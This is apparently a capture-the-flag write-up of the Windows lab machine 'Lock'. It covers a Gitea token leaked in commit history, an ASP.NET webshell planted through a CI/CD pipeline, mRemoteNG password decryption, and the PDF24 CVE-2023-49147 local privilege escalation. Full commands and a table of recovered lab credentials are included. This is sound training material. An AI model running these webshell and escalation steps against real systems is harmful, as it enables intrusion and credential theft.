---
tags:
  - Windows
  - Easy
  - RDP
  - xfreerdp
  - ASPNET
  - Gitea
  - git
  - webshell
  - mRemoteNG
  - PDF24
  - SetOpLock
  - Hard_Coded_Secret
---
![Machine Writeups/Windows/Easy/Lock/Images/banner.png](Images/banner.png)

## User
### Port Scan
As always, we first start off with an nmap scan. Looking at the results, we have four ports open: HTTP, SMB, an alternate HTTP, and RDP
```
# Nmap 7.95 scan initiated Thu Nov 13 01:43:53 2025 as: /usr/lib/nmap/nmap --privileged -sC -sV -vv -oA nmap/lock 10.129.8.162
Nmap scan report for 10.129.8.162
Host is up, received echo-reply ttl 127 (0.050s latency).
Scanned at 2025-11-13 01:43:54 GMT for 79s
Not shown: 996 filtered tcp ports (no-response)
PORT     STATE SERVICE       REASON          VERSION
80/tcp   open  http          syn-ack ttl 127 Microsoft IIS httpd 10.0
|_http-title: Lock - Index
|_http-favicon: Unknown favicon MD5: FED84E16B6CCFE88EE7FFAAE5DFEFD34
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
445/tcp  open  microsoft-ds? syn-ack ttl 127
3000/tcp open  http          syn-ack ttl 127 Golang net/http server
| http-methods: 
|_  Supported Methods: HEAD GET
|_http-title: Gitea: Git with a cup of tea
|_http-favicon: Unknown favicon MD5: F6E1A9128148EEAD9EFF823C540EF471
| fingerprint-strings: 
|   GenericLines, Help, RTSPRequest: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest: 
|     HTTP/1.0 200 OK
|     Cache-Control: max-age=0, private, must-revalidate, no-transform
|     Content-Type: text/html; charset=utf-8
|     Set-Cookie: i_like_gitea=a8e5dd7ec60510dc; Path=/; HttpOnly; SameSite=Lax
|     Set-Cookie: _csrf=CtX-6IRA5ONodj85WpTODSWnH-M6MTc2Mjk5ODI1Mjc4MjE2MTAwMA; Path=/; Max-Age=86400; HttpOnly; SameSite=Lax
|     X-Frame-Options: SAMEORIGIN
|     Date: Thu, 13 Nov 2025 01:44:13 GMT
|     <!DOCTYPE html>
|     <html lang="en-US" class="theme-auto">
|     <head>
|     <meta name="viewport" content="width=device-width, initial-scale=1">
|     <title>Gitea: Git with a cup of tea</title>
|     <link rel="manifest" href="data:application/json;base64,eyJuYW1lIjoiR2l0ZWE6IEdpdCB3aXRoIGEgY3VwIG9mIHRlYSIsInNob3J0X25hbWUiOiJHaXRlYTogR2l0IHdpdGggYSBjdXAgb2YgdGVhIiwic3RhcnRfdXJsIjoiaHR0cDovL2xvY2FsaG9zdDozMDAwLyIsImljb25zIjpbeyJzcmMiOiJodHRwOi8vbG9jYWxob3N0OjMwMDAvYXNzZXRzL2ltZy9sb2dvLnBuZyIsInR5cGUiOiJpbWFnZS9wbmciLCJzaXplcyI6IjU
|   HTTPOptions: 
|     HTTP/1.0 405 Method Not Allowed
|     Allow: HEAD
|     Allow: HEAD
|     Allow: GET
|     Cache-Control: max-age=0, private, must-revalidate, no-transform
|     Set-Cookie: i_like_gitea=a0b36e303de089c0; Path=/; HttpOnly; SameSite=Lax
|     Set-Cookie: _csrf=VfnZBDO_9KEysUtwbJI5iE3dtHg6MTc2Mjk5ODI1Mzc1MDM4MjUwMA; Path=/; Max-Age=86400; HttpOnly; SameSite=Lax
|     X-Frame-Options: SAMEORIGIN
|     Date: Thu, 13 Nov 2025 01:44:13 GMT
|_    Content-Length: 0
3389/tcp open  ms-wbt-server syn-ack ttl 127 Microsoft Terminal Services
|_ssl-date: 2025-11-13T01:45:15+00:00; +2s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: LOCK
|   NetBIOS_Domain_Name: LOCK
|   NetBIOS_Computer_Name: LOCK
|   DNS_Domain_Name: Lock
|   DNS_Computer_Name: Lock
|   Product_Version: 10.0.20348
|_  System_Time: 2025-11-13T01:44:35+00:00
| ssl-cert: Subject: commonName=Lock
| Issuer: commonName=Lock
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-11-12T01:42:58
| Not valid after:  2026-05-14T01:42:58
| MD5:   b863:aae0:d494:bf10:ea0c:3c94:1758:5049
| SHA-1: 9a9e:6d1e:b266:7040:9a88:6e44:fd86:ddcc:7a2d:09e6
| -----BEGIN CERTIFICATE-----
| MIICzDCCAbSgAwIBAgIQPYPrkRAo9Y1K9mdvdwNEPjANBgkqhkiG9w0BAQsFADAP
| MQ0wCwYDVQQDEwRMb2NrMB4XDTI1MTExMjAxNDI1OFoXDTI2MDUxNDAxNDI1OFow
| DzENMAsGA1UEAxMETG9jazCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEB
| AN98g11p+7SXhoyKQDnBVD4YKN9zgSeqa8EppL358PMBpGPOEBMN0OU/Gxvqtqof
| J662MQ6+qDGKutSA9c5wPpbpNq9zIZMs1LHcT2httGF0r9B/qQmAk5eWeFmnAFUB
| +IGCG0LAXHXhX1Lfq6DP1xEqZWGPRh12ubI7vPoWZR93ObJtbrvMRaNeS7lg6QaG
| iDM+JnLHiG9iRWNzqif47n/IOq5JCTE0Xwqi5ZTjvJtPOpxfZ47+PROK5PWoLHzq
| 79s1uYdd+L7+GG/7E7abQX+8wtb/YRNCUH3TKiouECqidX0vY/DXIFVSthjvirbY
| +8toYGo6Y02XKrjFv7kvwMECAwEAAaMkMCIwEwYDVR0lBAwwCgYIKwYBBQUHAwEw
| CwYDVR0PBAQDAgQwMA0GCSqGSIb3DQEBCwUAA4IBAQDRtjXhe9T/85KcVyPngqq5
| 0ORV9EhKp1ZH1ELrBtRHuzCKFHWj3NSGTfOLra3k7AsnDFyBk+EKzwYFmD7tQ0gt
| ESTXfVdPgMFAg4TXzWzwLmloxx77CiB4MKj4rzZwvfr3tvpu31aQCWtj5/ZY5mUZ
| e7MzFFLUcc6Fz/9FTulMWAJcbIk90cDvANVcUCHcuIHnD59jdB5Jv7g0gPHesRuD
| wPD7YzzXCNcZdTkz6KUlQbXxWPGD2UN3s9W9HsBKm9KqjWnkl3zRG3cwqgq9i85k
| hecV3MPMjjixyr5RFu0SH/QXZw2ioKC4Km2vH/DPvVvXWPHfNFL1Sfzi4tcxVHSk
|_-----END CERTIFICATE-----
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port3000-TCP:V=7.95%I=7%D=11/13%Time=691537EA%P=x86_64-pc-linux-gnu%r(G
SF:enericLines,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20
SF:text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\
SF:x20Request")%r(GetRequest,3000,"HTTP/1\.0\x20200\x20OK\r\nCache-Control
SF::\x20max-age=0,\x20private,\x20must-revalidate,\x20no-transform\r\nCont
SF:ent-Type:\x20text/html;\x20charset=utf-8\r\nSet-Cookie:\x20i_like_gitea
SF:=a8e5dd7ec60510dc;\x20Path=/;\x20HttpOnly;\x20SameSite=Lax\r\nSet-Cooki
SF:e:\x20_csrf=CtX-6IRA5ONodj85WpTODSWnH-M6MTc2Mjk5ODI1Mjc4MjE2MTAwMA;\x20
SF:Path=/;\x20Max-Age=86400;\x20HttpOnly;\x20SameSite=Lax\r\nX-Frame-Optio
SF:ns:\x20SAMEORIGIN\r\nDate:\x20Thu,\x2013\x20Nov\x202025\x2001:44:13\x20
SF:GMT\r\n\r\n<!DOCTYPE\x20html>\n<html\x20lang=\"en-US\"\x20class=\"theme
SF:-auto\">\n<head>\n\t<meta\x20name=\"viewport\"\x20content=\"width=devic
SF:e-width,\x20initial-scale=1\">\n\t<title>Gitea:\x20Git\x20with\x20a\x20
SF:cup\x20of\x20tea</title>\n\t<link\x20rel=\"manifest\"\x20href=\"data:ap
SF:plication/json;base64,eyJuYW1lIjoiR2l0ZWE6IEdpdCB3aXRoIGEgY3VwIG9mIHRlY
SF:SIsInNob3J0X25hbWUiOiJHaXRlYTogR2l0IHdpdGggYSBjdXAgb2YgdGVhIiwic3RhcnRf
SF:dXJsIjoiaHR0cDovL2xvY2FsaG9zdDozMDAwLyIsImljb25zIjpbeyJzcmMiOiJodHRwOi8
SF:vbG9jYWxob3N0OjMwMDAvYXNzZXRzL2ltZy9sb2dvLnBuZyIsInR5cGUiOiJpbWFnZS9wbm
SF:ciLCJzaXplcyI6IjU")%r(Help,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nCo
SF:ntent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n
SF:\r\n400\x20Bad\x20Request")%r(HTTPOptions,1A4,"HTTP/1\.0\x20405\x20Meth
SF:od\x20Not\x20Allowed\r\nAllow:\x20HEAD\r\nAllow:\x20HEAD\r\nAllow:\x20G
SF:ET\r\nCache-Control:\x20max-age=0,\x20private,\x20must-revalidate,\x20n
SF:o-transform\r\nSet-Cookie:\x20i_like_gitea=a0b36e303de089c0;\x20Path=/;
SF:\x20HttpOnly;\x20SameSite=Lax\r\nSet-Cookie:\x20_csrf=VfnZBDO_9KEysUtwb
SF:JI5iE3dtHg6MTc2Mjk5ODI1Mzc1MDM4MjUwMA;\x20Path=/;\x20Max-Age=86400;\x20
SF:HttpOnly;\x20SameSite=Lax\r\nX-Frame-Options:\x20SAMEORIGIN\r\nDate:\x2
SF:0Thu,\x2013\x20Nov\x202025\x2001:44:13\x20GMT\r\nContent-Length:\x200\r
SF:\n\r\n")%r(RTSPRequest,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConten
SF:t-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n
SF:400\x20Bad\x20Request");
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 1s, deviation: 0s, median: 1s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2025-11-13T01:44:36
|_  start_date: N/A
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 46986/tcp): CLEAN (Timeout)
|   Check 2 (port 19175/tcp): CLEAN (Timeout)
|   Check 3 (port 25316/udp): CLEAN (Timeout)
|   Check 4 (port 51030/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked

Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Nov 13 01:45:13 2025 -- 1 IP address (1 host up) scanned in 79.45 seconds

```

### Investigating Web Pages and Finding Gitea PAT
After a quick check that null authentication with SMB didn't work, I began to look at the web pages. The page on port 80 appeared to be relatively static with nothing interesting on it.

![main site.png](Images/main%20site.png)

Moving on to the web page on port 3000, we're presented with a Gitea instance:

![gitea front page.png](Images/gitea%20front%20page.png)

We can find a saved repository by clicking on "Explore" and then "dev-scripts" which contains `repos.py`:

![gitea explore.png](Images/gitea%20explore.png)

![gitea dev-scripts.png](Images/gitea%20dev-scripts.png)

![gitea repos.py link.png](Images/gitea%20repos.py%20link.png)

Clicking inside, we see a generic Python script that uses the Gitea API to pull a repositories list.

![gitea repos.py code.png](Images/gitea%20repos.py%20code.png)

There's nothing inherently interesting about the script, but on line 29 we notice that a `GITEA_ACCESS_TOKEN` environment variable is being used to pull a personal access token (PAT). Often times, in old commits, these are hard coded before the user thinks to pull it a more secure way. Let's check old commits by clicking on the "History" button:

![gitea history button.png](Images/gitea%20history%20button.png)

Here we see two commits. Let's choose the oldest commit on the bottom:

![gitea commits.png](Images/gitea%20commits.png)

As expected, at the top of the file, the PAT is hard coded and leaked to us as `43ce39bb0bd6bc489284f2905f033ca467a6362f`:

![gitea pat exposure.png](Images/gitea%20pat%20exposure.png)

### Enumerating Private Repos
The PAT essentially gives us access to `ellen.freeman`'s Gitea account through APIs and the `git` CLI. Thinking back to his `repos.py` script, it uses the Gitea API to list out his repos. This made me wonder if he had any additional repos that might be private. So, using the PAT and the Gitea API, I queried for `ellen.freeman`'s list of repos using the following `curl` command:

`curl http://10.129.8.162:3000/api/v1/user/repos -H 'Authorization: token 43ce39bb0bd6bc489284f2905f033ca467a6362f'`

![gitea ugly api.png](Images/gitea%20ugly%20api.png)

... this isn't the prettiest output. After some inspection, we can use `jq` to output only the available repo names:

`curl http://10.129.8.162:3000/api/v1/user/repos -H 'Authorization: token 43ce39bb0bd6bc489284f2905f033ca467a6362f' --silent | jq .[].name
`

![gitea api jq.png](Images/gitea%20api%20jq.png)

Much better. We can see that `ellen.freeman` owns two repos: the previously identified `dev-scripts`, and this new `website` repo. I imagine this contains the code for the boring static page we saw earlier on port 80. Let's pull it and take a look. Again utilizing the PAT we obtained earlier, we can pull the repository with `git`:

`git clone http://ellen.freeman:43ce39bb0bd6bc489284f2905f033ca467a6362f@10.129.8.162:3000/ellen.freeman/website.git`

### Uploading an ASP.NET Webshell to the Main Site
Looking into the new `website` directory that was pulled down, we do confirm that this is just a boring static site. However, the `readme.md` file reveals that a CI/CD pipeline will automatically deploy any additions to the webserver:

![git clone website.png](Images/git%20clone%20website.png)

Let's upload a webshell. Using `whatweb 10.129.8.162` reveals that the site is an ASP.NET site, so we'll search for a specific webshell for it.

![whatweb aspnet.png](Images/whatweb%20aspnet.png)

I ended up finding a repo [SharPyShell](https://github.com/antonioCoco/SharPyShell) which could be used to generate an ASP.NET webshell. After cloning and installing dependencies on a venv, I used the following command to generate the webshell:

`python3 SharPyShell.py generate -p password`

The generated webshell lands in the `output` folder in the repo. I moved it into the `website` repo and used `git add`, `git commit`, and `git push` to update the remote branch. 

![add webshell.png](Images/add%20webshell.png)

According to the README, this should trigger a pipeline that deploys the change to the actual webserver. We can now try to interact with the webshell by using the `interact` subcommand for `SharPyShell`.

`python3 SharPyShell.py interact -u http://10.129.8.162/sharpyshell.aspx -p password`

This successfully drops us into a pseudo-shell.

![interact with webshell.png](Images/interact%20with%20webshell.png)

### Cracking config.xml for Gale Dekarios's RDP Password
Looking around `ellen.freeman`'s user directory, there is no user flag on the Desktop. However, there is an interesting `config.xml` file under Documents. Thanks to `SharPyShell`, we can download it using the `#download` command.

![download config xml.png](Images/download%20config%20xml.png)

In the XML, we see an encrypted RDP password for `Gale.Dekarios` and nods to `mRemoteNG` with the `Icon` value:

```
<?xml version="1.0" encoding="utf-8"?>
<mrng:Connections xmlns:mrng="http://mremoteng.org" Name="Connections" Export="false" EncryptionEngine="AES" BlockCipherMode="GCM" KdfIterations="1000" FullFileEncryption="false" Protected="sDkrKn0JrG4oAL4GW8BctmMNAJfcdu/ahPSQn3W5DPC3vPRiNwfo7OH11trVPbhwpy+1FnqfcPQZ3olLRy+DhDFp" ConfVersion="2.6">
    <Node Name="RDP/Gale" Type="Connection" Descr="" Icon="mRemoteNG" Panel="General" Id="a179606a-a854-48a6-9baa-491d8eb3bddc" Username="Gale.Dekarios" Domain="" Password="TYkZkvR2YmVlm2T2jBYTEhPU2VafgW1d9NSdDX+hUYwBePQ/2qKx+57IeOROXhJxA7CczQzr1nRm89JulQDWPw==" Hostname="Lock" Protocol="RDP" PuttySession="Default Settings" Port="3389" ConnectToConsole="false" UseCredSsp="true" RenderingEngine="IE" ICAEncryptionStrength="EncrBasic" RDPAuthenticationLevel="NoAuth" RDPMinutesToIdleTimeout="0" RDPAlertIdleTimeout="false" LoadBalanceInfo="" Colors="Colors16Bit" Resolution="FitToWindow" AutomaticResize="true" DisplayWallpaper="false" DisplayThemes="false" EnableFontSmoothing="false" EnableDesktopComposition="false" CacheBitmaps="false" RedirectDiskDrives="false" RedirectPorts="false" RedirectPrinters="false" RedirectSmartCards="false" RedirectSound="DoNotPlay" SoundQuality="Dynamic" RedirectKeys="false" Connected="false" PreExtApp="" PostExtApp="" MacAddress="" UserField="" ExtApp="" VNCCompression="CompNone" VNCEncoding="EncHextile" VNCAuthMode="AuthVNC" VNCProxyType="ProxyNone" VNCProxyIP="" VNCProxyPort="0" VNCProxyUsername="" VNCProxyPassword="" VNCColors="ColNormal" VNCSmartSizeMode="SmartSAspect" VNCViewOnly="false" RDGatewayUsageMethod="Never" RDGatewayHostname="" RDGatewayUseConnectionCredentials="Yes" RDGatewayUsername="" RDGatewayPassword="" RDGatewayDomain="" InheritCacheBitmaps="false" InheritColors="false" InheritDescription="false" InheritDisplayThemes="false" InheritDisplayWallpaper="false" InheritEnableFontSmoothing="false" InheritEnableDesktopComposition="false" InheritDomain="false" InheritIcon="false" InheritPanel="false" InheritPassword="false" InheritPort="false" InheritProtocol="false" InheritPuttySession="false" InheritRedirectDiskDrives="false" InheritRedirectKeys="false" InheritRedirectPorts="false" InheritRedirectPrinters="false" InheritRedirectSmartCards="false" InheritRedirectSound="false" InheritSoundQuality="false" InheritResolution="false" InheritAutomaticResize="false" InheritUseConsoleSession="false" InheritUseCredSsp="false" InheritRenderingEngine="false" InheritUsername="false" InheritICAEncryptionStrength="false" InheritRDPAuthenticationLevel="false" InheritRDPMinutesToIdleTimeout="false" InheritRDPAlertIdleTimeout="false" InheritLoadBalanceInfo="false" InheritPreExtApp="false" InheritPostExtApp="false" InheritMacAddress="false" InheritUserField="false" InheritExtApp="false" InheritVNCCompression="false" InheritVNCEncoding="false" InheritVNCAuthMode="false" InheritVNCProxyType="false" InheritVNCProxyIP="false" InheritVNCProxyPort="false" InheritVNCProxyUsername="false" InheritVNCProxyPassword="false" InheritVNCColors="false" InheritVNCSmartSizeMode="false" InheritVNCViewOnly="false" InheritRDGatewayUsageMethod="false" InheritRDGatewayHostname="false" InheritRDGatewayUseConnectionCredentials="false" InheritRDGatewayUsername="false" InheritRDGatewayPassword="false" InheritRDGatewayDomain="false" />
</mrng:Connections>
```

I did some research on how to decrypt this password and found [mremoteng-decrypt](https://github.com/kmahyyg/mremoteng-decrypt) which did the trick:

![decrypt pass.png](Images/decrypt%20pass.png)

Using this decrypted password, we can RDP onto the box as `gale.dekarios` using the following command:

`xfreerdp /v:10.129.8.162 /u:gale.dekarios /p:ty8wnW9qCKDosXo6 /cert-ignore /smart-sizing`

On the desktop is `user.txt`.

![gale rdp.png](Images/gale%20rdp.png)

## Root
I tried to use my new account to look through SMB shares, but nothing interesting appeared. Looking again at the desktop, we see this `PDF24 Toolbox` application. We can open up PowerShell and get its version with this command (after locating it in `C:\Program Files\PDF24`):

`gci ./pdf24.exe | Format-List VersionInfo`

![get pdf24 version.png](Images/get%20pdf24%20version.png)

Having identified the version as `11.15.1`, it appears that this version of `PDF24` is vulnerable to `CVE-2023-49147`. This [SEC Consult](https://sec-consult.com/vulnerability-lab/advisory/local-privilege-escalation-via-msi-installer-in-pdf24-creator-geek-software-gmbh/) describes the methodology followed to perform the exploit. To start, I found a precomp of `SetOpLock.exe` from [this repo](https://github.com/p1sc3s/Symlink-Tools-Compiled) and pulled it onto the box.

![get setoplock.png](Images/get%20setoplock.png)

Following along with the instructions, I set the oplock on the `faxPrnInst.log` file with the following command:

`.\SetOpLock.exe "C:\Program Files\PDF24\faxPrnInst.log" r`

The terminal hangs which is normal. Then, continuing to follow the steps, I triggered a repair of `PDF24 Creator` by executing its .msi file. In our case, it's located in the `C:\_install` hidden directory. We can execute the file with:

`msiexec.exe /fa C:\_install\pdf24-creator-11.15.1-x64.msi`

If you chose to double click the msi instead, go through the wizard by clicking `Next` and then `Repair`. The remaining steps should be relatively the same here onward. After waiting some time, the first prompt asks if we want to auto close apps. We can choose "OK" and then "OK" again.

![click ok.png](Images/click%20ok.png)
![click ok again.png](Images/click%20ok%20again.png)

After some more waiting, a new dialog box for `pdf24-PrinterInstall.exe` should appear. Our `SetOpLock.exe` command from before causes it to hang, and the reason this is good is because, for whatever reason, this process is run as `SYSTEM` and causes the vulnerability. We can right click the top bar and choose "Properties".

![click properties.png](Images/click%20properties.png)

Then, we click on "legacy console mode" towards the bottom of the Properties dialog box. When prompted for an app to choose, we'll select Firefox. For whatever reason, Edge and Explorer don't maintain the `SYSTEM` permission level, while Firefox does.

![click legacy.png](Images/click%20legacy.png)

![choose firefox.png](Images/choose%20firefox.png)

Clicking "OK" will bring up an instance of Firefox. The final step is to press `Ctrl + o` , bringing up the "Open File" dialog box. Enter `cmd.exe` on the top bar and press `Enter`, giving us a `SYSTEM` shell.

![firefox instructions.png](Images/firefox%20instructions.png)

![get root shell.png](Images/get%20root%20shell.png)

## Credential List

| Username      | Password                                 | Description                                                                                       |
| ------------- | ---------------------------------------- | ------------------------------------------------------------------------------------------------- |
| ellen.freeman | 43ce39bb0bd6bc489284f2905f033ca467a6362f | Gitea PAT                                                                                         |
| gale.dekarios | ty8wnW9qCKDosXo6                         | RDP                                                                                               |
| ellen.freeman | YWFrWJk9uButLeqx                         | Bonus! Gitea password found at `C:\Users\ellen.freeman\.git-credentials`. Not needed for solution |
